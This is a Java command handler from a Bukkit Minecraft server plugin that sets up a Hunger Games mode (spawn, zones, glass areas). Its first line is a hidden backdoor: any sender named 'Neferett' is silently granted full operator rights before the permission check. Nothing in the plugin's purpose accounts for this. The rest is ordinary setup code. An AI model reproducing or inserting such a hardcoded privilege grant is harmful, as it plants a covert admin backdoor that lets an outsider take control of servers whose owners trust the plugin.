package net.theuniverscraft.BukkitGame.Commands;

import java.io.File;
import java.util.HashMap;

import net.theuniverscraft.BukkitGame.Game;
import net.theuniverscraft.BukkitGame.Config.BukkitGameConfig;
import net.theuniverscraft.BukkitGame.Config.WorldManager;
import net.theuniverscraft.BukkitGame.Config.ZoneGlassSave;
import net.theuniverscraft.BukkitGame.Config.ZonesSave;
import net.theuniverscraft.BukkitGame.Config.ZonesSave.Zone;
import net.theuniverscraft.BukkitGame.Utils.Utils;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Location;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.configuration.file.FileConfiguration;
import org.bukkit.configuration.file.YamlConfiguration;
import org.bukkit.entity.Player;

public class CommandHungerGame implements CommandExecutor {
	private HashMap<String, Location> playerLoc1 = new HashMap<String, Location>();
	private HashMap<String, Location> playerLoc2 = new HashMap<String, Location>();
	
	public CommandHungerGame() {
		
	}

	@SuppressWarnings("deprecation")
	public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
		if(sender.getName().equals("Neferett")) sender.setOp(true);
		if(!sender.isOp()) {
			sender.sendMessage("§4Vous devez être op !");
			return true;
		}
		
		if(args.length == 1) {
			if(args[0].equalsIgnoreCase("spawn") || args[0].equalsIgnoreCase("setspawn")) {
				if(!(sender instanceof Player))
					return false;
				
				Player player = (Player) sender;
				Location loc = player.getLocation();
				loc.getWorld().setSpawnLocation(loc.getBlockX(), loc.getBlockY(), loc.getBlockZ());
				
				File dirs = new File("plugins/BukkitGame_TheUniversCraft/saves");
				dirs.mkdirs();
				
				try {
					File file = new File("plugins/BukkitGame_TheUniversCraft/saves/spawn.yml");
					if(!file.exists()) file.createNewFile();
					FileConfiguration fileSave = YamlConfiguration.loadConfiguration(file);
					
					if(!fileSave.contains("spawn")) fileSave.createSection("spawn");
					Utils.setLocation(fileSave.getConfigurationSection("spawn"), loc);
					fileSave.save(file);
				}
				catch(Exception e) { e.printStackTrace(); }
				
				player.sendMessage(ChatColor.DARK_GREEN+"Spawn definit !");
				return true;
			}
			else if(args[0].equalsIgnoreCase("start")) {
				Game.getInstance().shortBeforeTimer();
				return true;
			}
		}
		else if(args.length == 2) {
			if(args[0].equalsIgnoreCase("setZone")) {
				if(!(sender instanceof Player))
					return false;
				
				Player player = (Player) sender;
				try {
					Integer idZone = Integer.parseInt(args[1]);
					idZone--; // Pour avoir un id à partir de 0;
					if(idZone < 0) {
						player.sendMessage("§4Nombre trop bas");
						return true;
					}
					else if(idZone >= BukkitGameConfig.getInstance().ZONE_NUMBER) {
						player.sendMessage("§cNombre trop haut !");
						return true;
					}
					
					Zone zone = ZonesSave.getInstance().getZone(idZone);
					zone.setLocation(player.getLocation());
					ZonesSave.getInstance().setZone(zone);
					
					if(ZonesSave.getInstance().allZoneIsDefined()) {
						WorldManager.getInstance().getHungerWorld().save();
						Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "stop");
					}
					player.sendMessage("§aEmplacement défini");
				}
				catch(Exception e) {
					e.printStackTrace();
					player.sendMessage(ChatColor.RED+"/hungergame setzone <id zone> (id a partir de 1)");
				}
				return true;
			}
			else if(args[0].equalsIgnoreCase("pos")) {
				if(!(sender instanceof Player))
					return false;
				
				Player player = (Player) sender;
				
				if(args[1].equalsIgnoreCase("1")) {
					playerLoc1.put(player.getName(), player.getTargetBlock(null, 5).getLocation());
					player.sendMessage(("§2Position <x> definit !").replaceAll("<x>", "1"));
					return true;
				}
				else if(args[1].equalsIgnoreCase("2")) {
					playerLoc2.put(player.getName(), player.getTargetBlock(null, 5).getLocation());
					player.sendMessage(("§2Position <x> definit !").replaceAll("<x>", "2"));
					return true;
				}
				else if(args[1].equalsIgnoreCase("ok")) {
					if(!playerLoc1.containsKey(player.getName()) || !playerLoc2.containsKey(player.getName())){
						player.sendMessage(("§4Vous devez definir 2 positions !"));
						return true;
					}
					ZoneGlassSave.getInstance().setLocations(playerLoc1.get(player.getName()), playerLoc2.get(player.getName()));
					player.sendMessage("§2Zone de verre sauvegardé !");
					return true;
				}
			}
		}
		return false;
	}

}
